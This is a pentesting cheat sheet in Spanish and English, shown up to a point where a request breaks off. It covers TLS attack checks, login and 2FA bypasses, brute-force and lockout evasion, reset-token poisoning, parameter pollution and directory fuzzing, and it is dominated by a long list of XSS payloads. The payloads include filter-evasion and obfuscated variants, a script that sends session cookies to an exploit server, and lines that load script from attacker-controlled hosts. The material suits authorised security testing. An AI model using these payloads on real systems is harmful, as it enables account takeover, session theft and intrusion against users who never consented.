(CVE-2014-3566) El uso de SSLv3 con cifrado CBC hace que el servidor sea vulnerable a ataques Man in The Middle, pudiendo descifrar bytes de los mensajes con solo 256 intentos por byte (asumiendo que se pueda forzar la aplicación para que envíe los mismos bytes varias veces).

```
OpenSSL> s_client -ssl3 -proxy 127.0.0.1:8080 -connect <server_victim>
```

- [ ] **BEAST/CRIME**

(CVE-2011-3389/CVE-2012-4929): El uso de TLSv1.0 con el cifrado CBC permite a un atacante con capacidad de forzar tráfico, descifrar las comunicaciones mediante el envio de mensajes de longitud variable y la observación en las diferencias de tamaño del mensaje cifrado.

```
OpenSSL> s_client -tls1 -cipher AES128-SHA -proxy 127.0.0.1:8080 --connect <server_victim>
```

- [ ] **LUCKY13**

(CVE-2013-0169): El servidor es compatible con cifrados CBC, que son vulnerables a ataques de padding oracle basados en el tiempo de procesado del algoritmo de autenticación de mensaje (MAC) utilizado.

```
OpenSSL> s_client -cipher AES128-SHA -proxy 127.0.0.1:8080 --connect <server_victim>
```

**Impactos**:

• SSLv3: existen fallos de seguridad que permiten a los atacantes capturar y alterar la información que pasa entre un cliente y el servidor.

• POODLE/BEAST/CRIME: Un atacante con capacidad de monitorizar el tráfico e inyectar datos en el mismo puede ser capaz de descifrar el contenido de los mensajes mediante un ataque de padding-oracle.
		
• Lucky13: Es posible observar diferencias significativas en el tiempo que el algoritmo de autenticación de mensajes (MAC) tarda en procesar el contenido, creando una vulnerabilidad de padding-oracle que permite a un atacante descifrar el contenido de los mensajes cifrados.

**Recomendación**:

Se recomienda la siguiente configuración de SSL como mínimo:
        • Uso de TLSv1.2
        • Uso del cifrado AES-GCM
        • Uso del algoritmo de hash SHA256
        • Deshabilitación de la compresión HTTP en canales TLS
        • Habilitar renegociación segura
        • Uso de claves de cifrado mayores a 128 bits


# Authentication

El sistema de autenticación de un sitio web generalmente consta de varios mecanismos distintos donde pueden ocurrir vulnerabilidades.

Algunas vulnerabilidades son ampliamente aplicables en todos estos contextos, mientras que otras son más específicas de la funcionalidad proporcionada.

Es recomendable tener dos ficheros "users" y "passwords" para testear fuerza bruta.

## Vulnerabilities in Login

- [ ] **User Enumeration**

Prestar especial atención al momento de enumerar usarios al "Códigos de estado", "Mensajes de error", "Tiempos de respuesta" y "Errores Tipográficos".

- [ ] **User Enumeration mediante Bloqueo de Cuenta**

Con el ataque "Cluster Bomb" agregar una posición en blanco al final del cuerpo de la request:

```
username=§invalid-username§&password=example§§.
```

Para el primer conjunto de payloads, seleccione los "username" para enumerar con fuerza bruta.

Para el segundo conjunto de payloads, seleccione el tipo "Null payloads" y elija la opción para generar 10 payloads. Esto hará que cada nombre de usuario se repita 10 veces. 

Notar que las respuestas de uno de los nombres de usuario es más largas que las respuestas cuando se usan otros nombres de usuario, "You have made too many incorrect login attempts". Este nombre de usuario es válido.

- [ ] **Evasión Bloqueo de IP**

Utilizar el header "X-Forwarded-For" para falsificar la dirección IP atacante y evadir los controles de bloqueo de IP

```
Host: example.com
X-Forwarded-For: 127.0.0.1
```

- [ ] **Evasión Bloqueo de Cuenta**

Si la sesión se bloqueo luego de X intentos, es recomendable enviar las credenciales válidas un intento antes de que se bloquee la cuenta al momento de probar fuerza bruta.

```
# INTRUDER ATTACK:

user: invalid_01   |  pass: cualquiera
user: invalid_02   |  pass: cualquiera
user: correcto     |  pass: correcta
user: invalid_03   |  pass: cualquiera
user: invalid_04   |  pass: cualquiera
user: correcto     |  pass: correcta
```

- [ ] **Enviar un Array de Contraseñas en una sola Request**

Es posible evadir protecciones IP si se puede averiguar cómo adivinar varias contraseñas con una sola solicitud:

```
{
"username" : "userVictima",
"password" : [
    "password01",
    "password02",
    "password03"
    ...
]
}
```

- [ ] **Autenticación Básica HTTP**

En la autenticación básica HTTP, el cliente recibe un token de autenticación del servidor, que se construye concatenando el nombre de usuario y la contraseña y codificándolos en Base64.

```
Authorization: Basic base64(username:password)
```

## Vulnerabilities in Multi-Factor Authentication

- [ ] **2FA Simple Bypass** 

Cuando se ingresan credenciales correctas, a veces el usuario queda en un estado "logged in" antes de ingresar el código de verificación OTP. En este caso, intentar ir directamente a las páginas de navegación como usuario registrado.

```
# Only Users with Login
http://example.com/my-account
```

- [ ] **Flawed 2FA Verification Logic**

La lógica defectuosa en la autenticación de dos factores significa que después de que un usuario ha completado el paso de inicio de sesión inicial, el sitio web no verifica adecuadamente que el mismo usuario está completando el segundo paso.

Por ejemplo, el usuario inicia sesión con sus credenciales normales en el primer paso de la siguiente manera:

```
POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
...
username=carlos&password=qwerty
```

Luego se le asigna una cookie que se relaciona con su cuenta, antes de pasar al segundo paso del proceso de inicio de sesión:

```
HTTP/1.1 200 OK
Set-Cookie: account=carlos
```

```
GET /login-steps/second HTTP/1.1
Cookie: account=carlos
```

Al enviar el código de verificación, la solicitud utiliza esta cookie para determinar a qué cuenta está intentando acceder el usuario:

```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
...
verification-code=123456
```

En este caso, un atacante podría iniciar sesión con sus propias credenciales, pero luego cambiar el valor de la cookie a cualquier nombre de usuario arbitrario al enviar el código de verificación.

```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456
```

Esto es extremadamente peligroso si el atacante es capaz de aplicar fuerza bruta al código de verificación, ya que le permitiría iniciar sesión en cuentas de usuarios arbitrarios basándose completamente en su nombre de usuario. Ni siquiera necesitarían saber la contraseña del usuario.

- [ ] **Brute-forcing 2FA Verification Codes**

Cuando un sitio web cierra automáticamente la sesión de un usuario si ingresa una cierta cantidad de códigos OTP incorrectos, es posible evadir este filtro creando Macros para Burp Intruder.

La idea es que se vuelve a iniciar sesión automáticamente como el usuario víctima antes de que se cierre la sesión.

*Reference:*
*https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack*



## Vulnerabilities in Other Authentication Mechanisms

- [ ] **Explotar Funcionalidad de Recordar Usuario**

Esta funcionalidad a menudo se implementa generando un token de "recordarme" de algún tipo, que luego se almacena en una cookie persistente.

Cifrada:

```
Cookie: stay-logged: Y2dvbnphbG86NTFkYzMwZGRjNDczZDQzYTYwMTFlOWViYmE2Y2E3NzA=
```

Descifrada Base64:

```
Cookie: stay-logged: cgonzalo:51dc30ddc473d43a6011e9ebba6ca770
```

Descifrada MD5:

```
Cookie: stay-logged: cgonzalo:peter
```

Luego, desde Intruder es posible enviar valores codificados en Base64 y hasheados con MD5, anteponiendo el "user" en la cookie. Esto desde las opciones de "Payload processing" en Intruder.


- [ ] **XSS y Robo de Cookie Crítica**

Si se consigue un XSS Stored en el aplicativo, es posible robar las cookies de sesión:

```
<script>document.location='//your-exploit-server-id.web-security-academy.net/'+document.cookie</script>
```

- [ ] **Restablecer Contraseñas Usando una URL**

Las implementaciones menos seguras de este método utilizan una URL con un parámetro fácilmente adivinable para identificar qué cuenta se está restableciendo:

```
# Original URL
http://vulnerable-website.com/reset-password?user=victim-user
```

Luego:

```
# Modified URL
http://vulnerable-website.com/reset-password?user=attacker-user
```

- [ ] **Restablecer Contraseñas Usando Token**

Una mejor implementación de este proceso es generar un token de alta entropía difícil de adivinar y crear la URL de restablecimiento basada en eso. En el mejor de los casos, esta URL no debería proporcionar pistas sobre qué contraseña de usuario se está restableciendo.

```
# URL Robusta
http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8
```

Cuando el usuario visita esta URL, el sistema debe verificar si este token existe en el back-end y, de ser así, qué contraseña de usuario se supone que debe restablecer. Este token debe caducar después de un corto período de tiempo y destruirse inmediatamente después de que se haya restablecido la contraseña.

Sin embargo, algunos sitios web tampoco pueden validar el token nuevamente cuando se envía el formulario de restablecimiento. En este caso, un atacante podría simplemente visitar el formulario de restablecimiento desde su propia cuenta, eliminar el token y aprovechar esta página para restablecer la contraseña de un usuario arbitrario.

Solicitud de reestablecimiento original:

```
POST /forgot-password?token=qNyVusP8ZkUBFAbTB4pOlHwMnvNJT3dg
...
username=user&token=qNyVusP8ZkUBFAbTB4pOlHwMnvNJT3dg
```

Solicitud de reestablecimiento maliciosa borrando el token:

```
POST /forgot-password?token=
...
username=attacker&token=
```

- [ ] **Poisoning URL Token**

Si la URL en el correo electrónico de restablecimiento se genera dinámicamente, esto también puede ser vulnerable al envenenamiento de restablecimiento de contraseña. 

Si se envía un enlace que contiene un token de restablecimiento único por correo electrónico, el header "X-Forwarded-Host" tal vez puede usarse para apuntar el enlace de restablecimiento generado dinámicamente a un dominio arbitrario.

```
POST /forgot-password
X-Forwarded-Host: attackerserver
...
username=victim.com
```

Cuando llegue el token a su servidor atacante utilícelo para reestablecer la contraseña de la cuenta "victim.com".

- [ ] **Cambiar Contraseñas de Usuarios Aleatorios**

La funcionalidad de cambio de contraseña puede ser particularmente peligrosa si permite que un atacante acceda a ella directamente sin iniciar sesión como usuario víctima. 

Por ejemplo, si el nombre de usuario se proporciona en un campo oculto, un atacante podría editar este valor en la solicitud para apuntar a usuarios arbitrarios. Esto puede potencialmente explotarse para enumerar nombres de usuario y contraseñas de fuerza bruta.

Desde la cuenta del usuario atacante, debe validar que la aplicación valida primero la contraseña actual y permite el cambio de usuario para esta funcionalidad:

```
# REQUEST

username=usuarioVictima
currentPasswd: invalida123
newPasswd: Test1
repeatNewPasswd: Test2

# RESPONSE

Current password is incorrect
```

```
# REQUEST

username=usuarioVictima
currentPasswd: correcta123
newPasswd: Test1
repeatNewPasswd: Test2

# RESPONSE

New passwords do not match
```

Dependiendo de las respuestas que brinde el aplicativo, es posible aplicar fuerza bruta para conseguir la contraseña válida del usuario víctima. 






# HTML Parameter Pollution (HPP)

In the event that the request contains multiple values for the parameter in question, you can give three possibilities:

1. That the method returns the first value of the parameter
2. To return the last
3. Or to return a combination of all values.

*https://www.elladodelmal.com/2011/03/hpp-http-parameter-pollution.html*

- [ ] **Server-Side HPP**

An attacker could try to add another "from" parameter to trick the server, and in that case, this parameter would transact from one account to another that is not owned by the attacker.

Normal:

```
https://example.com/transfer?from=1377&to=1234&amount=5000
```

Exploited:

```
https://example.com/transfer?from=1377&to=1234&amount=5000&from=1338
```

- [ ] **Client-Side**

An attacker could add other "candidate" param and send this to the victim. When the victim open the URL, it won't matter what your vote, this will be always "green" vote.

Normal:

```
http://example.com/votation?candidate=green&vote=1
```

Exploited:

```
http://example.com/votation?candidate=green&vote=1%26candidate=black
```

- [ ] **E-mail address payloads**

```
email=victim@example.com&email=attacker@example.com
```

# Fuzzing Directories

- [ ] **Fuzzing**

```
gobuster dir -u [URL] -w [WORDLIST] -t [THREADS]

wfuzz -c --hc=403,404 -t 500 -w [WORDLIST] -w extensions.txt http://10.10.10.56/FUZZ.FUZ2Z

dirsearch.py -u <URL> -w <WORDLIST> -f -e <extensions>

/opt/dirsearch/dirsearch.py -u http://sec03.rentahacker.htb -e php,html
```

- [ ] **Discover the parameter of a shell in web server**

```
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://sec03.rentahacker.htb/shell.php?FUZZ=id --hh 0
```

*Reference: scavenger box (htb)*



# HTML Injection

- [ ] **Payloads**

```
<html>test</html>

<htm>test</htm>

<h1>test</h1>

<h1><a href ="http://example.com/">TEST</a></h1>

</br><h1>TEST</h1><img src="http://bing.com/"></br><h1>Test2</h1></br>

<math><maction actiontype="statusline#http://bing.com" xlink:href="javascript:alert(9)">CLICKME</maction></math>

"/><h1>holis</h1>
```

# XSS

- [ ] **Good Payloads:**

```
"><p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y

"><sVg/onload=confirm(8)>

"><sVg/onload=confirm(8)//

"><sVg/onload=confirm(8"

"><img/src=x onerror=confirm(8)>

"><abbr onmouseleave=alert(9)>test_gc</abbr>

"><iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">

\u0022><iframe\u002Fsrc\u003D\u0022data:text\u002Fhtml;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg\u003D\u003D\u0022>

\u0022><iframe/src="https://www.example.com/" style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(8)">

<iframe src="https://isecauditors.com/,javascript:alert(1)//">

<</div>script</div>>alert()<</div>/script</div>>

<</div>script</div>>prompt(8)<</div>/script</div>>

"><video controls onloadstart="alert(8)"><source src=x></video>

" onmouseover=alert(9205) bad="

<body onafterprint=alert(1)>

<xss onafterscriptexecute=alert(1)><script>1</script>

<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>

<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>

<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>

<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>

"><img src="x/><script>alert(8)</script>">

<!<script>alert(1)</script>

-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>

><style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>

holis"><a/href="javascript:alert(1)">

holis"><a\x09href="javascript:alert(8)">

holis"><a href\x20="javascript:alert(1)">

holis"><a href="&Tab;javascript:alert(1)">

holis"><a href="&#x001;javascript:alert(1)">

holis"><a href="javas&Tab;cript:alert(1)">

holis"><a href="javascript:~alert(1)">

holis"><a href="javascript://%0d%0aalert(1)">

holis"><a href="javascript:\x0calert(1)">

holis"><a href="javascript:%ef%bb%bfalert(1)">

holis"><a href="javascript:&#xfeff;alert(1)">

holis"><a href=ja&NewLine;vascript:alert(1)>

holis"><a href=ja&Tab;vascript:alert(1)>

holis"><a href=ja&#x0000A;vascript:alert(1)>

holis"><a href=java&#x73;cript:alert()>

holis"><a href=javascript&colon;alert()>

holis"><a href=javascript&#x0003A;alert()>

holis"><a href=javascript&#58;alert(1)>

holis"><a href=javascript&#x3A;alert()>

holis"><a href=javascript:alert&lpar;&rpar;>

holis"><a href=javascript:x='%27-alert(1)-%27';>

holis"><a href=javascript:%61%6c%65%72%74%28%29>

holis"><a href=javascript:a\u006Cert``>

holis"><a href=javascript:\u0061\u006C\u0065\u0072\u0074``>

holis"><iframe/onload=write(8)>

holis"><iframe/onload=confirm(8)>

holis"><svg/onload=location=name>

--><svg onload=alert(1)>

-><svg onload=alert(1)>

holis"><script/x>alert(1)</script>
```

- [ ] **Nice Payloads**

```
"o<x>nmouseover=alert<x>(1)//

"autof<x>ocus o<x>nfocus=alert<x>(1)//

holis"><script/src=//Ǌ.₨></script>

holis"><iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">

holis"><iframe/onload=src=contentWindow.name+/\Ǌ.₨?/>

holis"><iframe/srcdoc="<script/src=//Ǌ.₨></script>">

holis"><style/onload=write(8)>

holis"><svg/onload=import(/\\Ǌ.₨/)>

holis"><style/onload=import(/\\Ǌ.₨/)>

javaxscript:alert(1)

"><svg/onload=alert%26%230000000040"1">

"><img src=x "accesskey="x" onclick="confirm(document/*00000*/./*00000*/cookie)"//BBBBBBBBBB=1>

';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

"><input/onauxclick="[1].map(prompt)">

<img src=x onerror=eval(atob('YWxlcnQoJ0kgb25seSB3cml0ZSBsYW1lIFBvQ3MnKQ==')) />

'"--><Body onbeforescriptexecute="[1].map(confirm)">

'-prompt.call(window, 'xss')-'

'-alert.call(window, 'xss')-'

<\/script><script>alert('XSS')<\/script>

aaa"bbb'ccc<svg onload=alert('XSS')>eee

javascript://%0a%0dalert(document.cookie)

<--`<img/src=`%20onerror=confirm``>%20--!>

<svg </onload ="1> (_=alert,_(1337)) "">

<details/open/ontoggle=window.alert`xss`>

<svg onload=prompt%26%230000000040document.domain)>

<svg onload=prompt%26%230000000040document.domain)>

<svg onload=prompt%26%23x000000028;document.domain)>

xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
```

- [ ] **Best Payloads**

```
holis"><a href=ja&#x0000A;va&#x73;cript&colon;al&#x65;rt``>

holis"><a href="https://bing.com/" title="title">xss <img onerror=alert(1) src=x></a>

test"><a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">xss &lt;img onerror=alert(1) src=x></a>

test"><svg/onload=write('\74img/src/o\156error\75alert\501\51\76')>

holis"><iframe/onload=import(/\\Ǌ.₨/)>

holis"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
```


- [ ] **Emails Payloads**

```
testacc@hubopss.com‘-alert(9)-’

testacc@hubopss.com'-alert(9)-'

test+(<script>alert(0)</script>)@example.com

test@example(<script>alert(0)</script>).com

"<script>alert(0)</script>"@example.com

“<script src=x onerror=confirm(8)>”@email.com
```

- [ ] **Domain, Refererer, Host, Cookie, X-Forwarded-For**

```
http://example.com/path/about/xss/<payload>
```
```
Host: www.bing.com"><script>alert(document.domain)</script><"
```
```
Referer: cgonzalo
```
```
X-Forwarded-Host: cgonzalo
```
```
Cookie: JSESSIONID=cgonzalo
```

- [ ] **Tag Block Breakout**

Úselo cuando la entrada aterrice dentro o entre la apertura/cierre de las siguientes etiquetas:

```
<title>, <style>, <script>, <textarea>, <noscript>, <pre>, <xmp>, <iframe>, <tag>
```

```
</tag><svg onload=alert(1)>

"></tag><svg onload=alert(1)>

</noscript><svg onload=alert(1)>

"></noscript><svg onload=alert(1)>
...
...
...
```

- [ ] **Injection Inline**

Úselo cuando la entrada se encuentre dentro del VALOR de un ATRIBUTO de una etiqueta HTML, pero esa etiqueta no puede terminar con un signo mayor que (>).

```
"onmouseover=alert(1) //
"autofocus onfocus=alert(1) //
```

- [ ] **Source Injection**

Úselo cuando la entrada aterrice como un valor de los siguientes atributos de etiqueta HTML: 

```
"href", "src", "data", "action" o "<form action=>""
```

El atributo "src" en las etiquetas de "script" puede ser:

```
src=URL

src="data:,alert(1)"

src=javascript:alert(1)

src='javascript:alert(1)'

src=‘javascript:alert(1)‘

src=’javascript:alert(1)’

src=‘javascript:alert(1)’
```

- [ ] **Script Injection**

Úselo cuando la entrada aterrice en un bloque "script", dentro de un valor delimitado por cadena:

```
'-alert(1)-'

'/alert(1)//

‘-alert(1)-’

‘/alert(1)//

\'/alert(1)//

</script><svg onload=alert(1)>

></script><svg onload=alert(1)>

"></script><svg onload=alert(1)>

'}alert(1);{'

'}alert(1)%0A{'

\'}alert(1);{//

/alert(1)//\

/alert(1)}//\
```

- [ ] **Placeholder Injection in Template Literal**

Úselo cuando la entrada aterrice dentro de cadenas delimitadas con comillas inversas (\`\`) o en motores de plantilla:

```
${alert(1)}
```

- [ ] **Multi Reflection Injection**

Úselo para aprovechar múltiples reflejos en la misma página: (Testear HPP)

```
'onload=alert(1)><svg/1='

'>alert(1)</script><script/1='

*/alert(1)</script><script>/*

*/alert(1)">'onload="/*<svg/1='

`-alert(1)">'onload="`<svg/1='

*/</script>'>alert(1)/*<script/1='

p=<svg/1='&q='onload=alert(1)>

p=<svg 1='&q='onload='/*&r=*/alert(1)'>

q=<script/&q=/src=data:&q=alert(1)>
```

- [ ] **File Upload Injection (Filename)**

Úselo cuando el nombre del archivo cargado se refleje en algún lugar de la página de destino:

```
"><svg onload=alert(1)>.gif
```

- [ ] **File Upload Injection (Metadata)**

Úselo cuando los metadatos del archivo cargado se reflejen en algún lugar de la página de destino. 
Utiliza 'exiftool' de línea de comandos y se puede configurar cualquier campo de metadatos:

```
exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
```

- [ ] **File Upload Injection (SVG File)**

Úselo para crear un XSS almacenado en el target al cargar archivos de imagen. Guarde el contenido a continuación como "xss.svg":

```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

- [ ] **DOM Insert Injection**

Úselo para probar XSS cuando la inyección se inserta en el DOM como marcado válido en lugar de reflejarse en el código fuente. 
Funciona para casos en los que la etiqueta "script" y otros vectores no funcionan:

```
<img src=1 onerror=alert(1)>

<iframe src=javascript:alert(1)>

<details open ontoggle=alert(1)>

<svg><svg onload=alert(1)>
```

- [ ] **PHP Self URL Injection**

Úselo cuando el código PHP subyacente del destino utilice la URL actual como un valor de atributo de un formulario HTML.
Por ejemplo, inyecte entre la extensión php y el inicio de la parte de la consulta (?) usando una barra inclinada (/):

```
https://vulnerable.com/xss.php/"><svg onload=alert(1)>?a=reader
```

- [ ] **Markdown Vector**

Úselo en cuadros de texto, secciones de comentarios, etc., que permitan algunas entradas de marcado. Haga clic para que se ejecute el código JavaScript:

```
[clickme](javascript:alert`1`)
```

- [ ] **No Closing Tag**

Úselo cuando haya una etiqueta de "script" de cierre (\</script>) en algún lugar del código después de la reflexión:

```
<script src=data:,alert(1)>

<script src=//[AttackerServer]/maliciousxss.js>
```

- [ ] **Javascript postMessage() with iframe**

Úselo cuando haya un detector de eventos de "message".

Como en "window.addEventListener ('message', \*)" en el código JavaScript sin una verificación de origen (\*). 

El objetivo debe poder enmarcarse (encabezado de "X-Frame-Options" según el contexto). 

Guarde como archivo HTML (o usando data:text/html) proporcionando TARGET_URL e INJECTION (un vector XSS o carga útil):

```
<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
```

- [ ] **XML-Based XSS**

Úselo para inyectar el vector XSS en una página XML (content type "text/xml" o "application/xml").

Anteponga un “->” a la carga útil si la entrada aterriza en una sección de comentarios o “]]>” si la entrada aterriza en una sección CDATA:

```
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>

<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//[AttackerServer]/ficheroconxss.js"/>
```

- [ ] **AngularJS Injections (v1.6 and up)**

Úselo cuando haya una biblioteca AngularJS cargada en la página, dentro de un bloque HTML con la directiva "ng-app" (primera carga útil) o creando la suya propia (segunda):

```
{{$new.constructor('alert(1)')()}}
<x ng-app>{{$new.constructor('alert(1)')()}}
```

- [ ] **Type Juggling**

Úselo para pasar una condición "if" que coincida con un número en comparaciones imprecisas:

```
1<svg onload=alert(1)>

1"><svg onload=alert(1)>
```

XSS in SSI

Úselo cuando haya una inyección de inclusión del lado del servidor (SSI):

```
<<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->>
```

- [ ] **Injection in JSP Path**

Utilizar en aplicaciones basadas en JSP en la ruta de URL:

```
//DOMAIN/PATH/;<svg onload=alert(1)>

//DOMAIN/PATH/;"><svg onload=alert(1)>
```

- [ ] **Bootstrap Vector (up to v3.4.0)**

Úselo cuando haya una librería de "Bootstrap" en la página. 

También pasa por alto "Webkit Auditor", simplemente haga clic en cualquier parte de la página para activar.

Cualquier carácter de valor "href" puede codificarse en HTML para omitir los filtros:

```
<html data-toggle=tab href="<img src=x onerror=alert(1)>">
```

- [ ] **XSS in HTTP Header - Cached**

Úselo para almacenar un vector XSS en la aplicación utilizando el esquema de caché MISS-MISS-HIT (si existe uno).

Reemplace \<XSS> con su vector respectivo y TARGET con una cadena ficticia para evitar la versión en caché real de la página. Realiza la misma solicitud 3 veces:

```
curl -i http://example.com/test123.php
```

Si se observa algún header del tipo "header-especial: HIT", se debe agregar algo en la URL para evitar la caché, ya que el valor de "HIT" implica que está llegando al WAF:

```
curl -i http://example.com/test123.php?cgonzalo
```

Ahora se observa el valor de "header-especial: MISS", lo cual indica que esta URL es una versión no almacenada en caché de la página.

Luego, inyectar nuestro propio encabezado (con la flag -H) para verificar si aparece como respuesta:

```
curl -iH "Test: myValue" http://example.com/test123.php?cgonzalo
```

Si se refleja, inyectar el payload que desee para XSS:

```
curl -iH "XSS: <svg onload=alert(8)>" http://example.com/test123.php?nuevoxssstored
```

Repetir hasta que se muestre "header-especial: HIT", lo cual indica que se ha almacenado hasta que caduque la caché.


- [ ] **Alert without Parentheses**

Úselo en un vector HTML o inyección de javascript cuando no se permiten paréntesis y PoC requiere devolver cualquier información de destino:

```
setTimeout`alert\x28document.domain\x29`

setInterval`alert\x28document.domain\x29`

setTimeout'alert\x28document.domain\x29'

setInterval'alert\x28document.domain\x29'

alert`1`

alert'1'

alert"1"

<svg onload=alert&lpar;1&rpar;>

<svg onload=alert&#40;1&#41>

(alert)(1)

a=alert,a(1)

[1].find(alert)

top["al"+"ert"](1)

top[/al/.source+/ert/.source](1)

al\u0065rt(1)

top['al\145rt'](1)

top[8680439..toString(30)](1)

holis"><svg onload=top[/al/.source+/ert/.source](1)>
```

- [ ] **Hieroglyphy**

```
<script>क='',ख=!क+क,ग=!ख+क,घ=क+{},ङ=ख
[क++],च=ख[छ=क],ज=++छ+क,झ=घ[छ+ज
],ख[झ+=घ[क]+(ख.ग+घ)[क]+ग[ज]+ङ+
च+ख[छ]+झ+ङ+घ[क]+च][झ](ग[क]+ग[
छ]+ख[ज]+च+ङ+'`एक्स०एस०एस`')``</script>

<svg onload=ꆇ='',ꉄ=!ꆇ+ꆇ,ꉦ=!ꉄ+ꆇ,ꊗ=ꆇ+{},ꀻ=ꉄ[ꆇ++],ꃋ=ꉄ[ꆚ=ꆇ],ꋕ=++ꆚ+ꆇ,ꐍ=ꊗ[ꆚ+ꋕ],ꉄ[ꐍ+=ꊗ[ꆇ]+(ꉄ.ꉦ+ꊗ)[ꆇ]+ꉦ[ꋕ]+ꀻ+ꃋ+ꉄ[ꆚ]+ꐍ+ꀻ+ꊗ[ꆇ]+ꃋ][ꐍ](ꉦ[ꆇ]+ꉦ[ꆚ]+ꉄ[ꋕ]+ꃋ+ꀻ+"(ꆇ)")()>

<script>
ⵗ='',ⵗⵗ=!ⵗ+ⵗ,ⵗⵗⵗ=!ⵗⵗ+ⵗ,ⵗⵗⵗⵗ=ⵗ+{},ⵗⵗⵗⵗⵗ=ⵗⵗ[ⵗ++],ⵗⵗⵗⵗⵗⵗ=ⵗⵗ[ⵗⵗⵗⵗⵗⵗⵗ=ⵗ],ⵗⵗⵗⵗⵗⵗⵗⵗ=++ⵗⵗⵗⵗⵗⵗⵗ+ⵗ,ⵗⵗⵗⵗⵗⵗⵗⵗⵗ=ⵗⵗⵗⵗ[ⵗⵗⵗⵗⵗⵗⵗ+ⵗⵗⵗⵗⵗⵗⵗⵗ],ⵗⵗ[ⵗⵗⵗⵗⵗⵗⵗⵗⵗ+=ⵗⵗⵗⵗ[ⵗ]+(ⵗⵗ.ⵗⵗⵗ+ⵗⵗⵗⵗ)[ⵗ]+ⵗⵗⵗ[ⵗⵗⵗⵗⵗⵗⵗⵗ]+ⵗⵗⵗⵗⵗ+ⵗⵗⵗⵗⵗⵗ+ⵗⵗ[ⵗⵗⵗⵗⵗⵗⵗ]+ⵗⵗⵗⵗⵗⵗⵗⵗⵗ+ⵗⵗⵗⵗⵗ+ⵗⵗⵗⵗ[ⵗ]+ⵗⵗⵗⵗⵗⵗ][ⵗⵗⵗⵗⵗⵗⵗⵗⵗ](ⵗⵗⵗ[ⵗ]+ⵗⵗⵗ[ⵗⵗⵗⵗⵗⵗⵗ]+ⵗⵗ[ⵗⵗⵗⵗⵗⵗⵗⵗ]+ⵗⵗⵗⵗⵗⵗ+ⵗⵗⵗⵗⵗ+"(ⵗ)")()
</script>
```

*Fuente:*
*https://aem1k.com/aurebesh.js/*


- [ ] **Alert Alternative – Write & Writeln**

Úselo como una alternativa para "alert", "prompt" y "confirm". 

Si se usa dentro de un vector HTML, se puede usar tal cual, pero si es una inyección JS, se requiere el formulario completo "document.write". 

Reemplace "&" por "%26" y "#" por "%23" en las URL. 

"Write" se puede reemplazar por "writeln":

```
write`XSSed!`

write`<img/src/o&#78error=alert&lpar;1)&gt;`

write('\74img/src/o\156error\75alert\501\51\76')

"><svg/onload=writeln('\74img/src/o\156error\75alert\501\51\76')>

"><svg/onload=write('\74img/src/o\156error\75alert\501\51\76')>
```

- [ ] **Alert Alternative – Open Pseudo-Protocol**

Úselo como una alternativa para "alert", "prompt" y "confirm".

```
top.open`javas\cript:al\ert\x281\x29`
top.open`javas\cript:al\ert\x281\x29${0}0`
```

- [ ] **Jump to URL Fragment**

Úselo cuando necesite ocultar algunos caracteres de su carga útil que activarían un WAF.

Usa el payload después del fragmento de URL (#):

```
eval(URL.slice(-8)) #alert(1)

eval(location.hash.slice(1)) #alert(1)

document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
```

- [ ] **Second Order XSS Injection**

Úselo cuando su entrada se use dos veces, cuando se almacena normalizada en una base de datos y luego se recupera para su uso posterior o se inserta en DOM:

```
&lt;svg/onload&equals;alert(1)&gt;
```

- [ ] **PHP Spell Checker Bypass**

Úselo para omitir la función "pspell_new" de PHP, que proporciona un diccionario para intentar adivinar la entrada utilizada para la búsqueda.

Una función similar a la de Google para los campos de búsqueda:

```
<scrpt> confirm(1) </scrpt>
<scrpt>write(1)</scrpt>
<scrpt> write(1) </scrpt>
```

- [ ] **Script simple para robar los detalles del usuario actualmente conectado**

```
fetch("https://redacted.com/path/to/userinfo").then(a => a.json()).then(a => console.log(a.response)); //En lugar de registrar la información del usuario, un atacante puede enviarla a su servidor
```

Payload final enviado a la victima:

```
https://redacted.com/endpoint?continue_url=redacted.com&continue_url=java%09Script:fetch(%22https://redacted.com/path/to/userinfo%22).then(a%3D%3Ea.json()).then(a%3D%3Econsole.log(a.response));//
```

- [ ] **XSS in SVG & PNG Profile Picture**

One easy way to test for this vulnerability is to upload a SVG file as your profile picture as shown in the below burp requests:

- **First PoC: (svg)**

```
-----------------------------232181429808
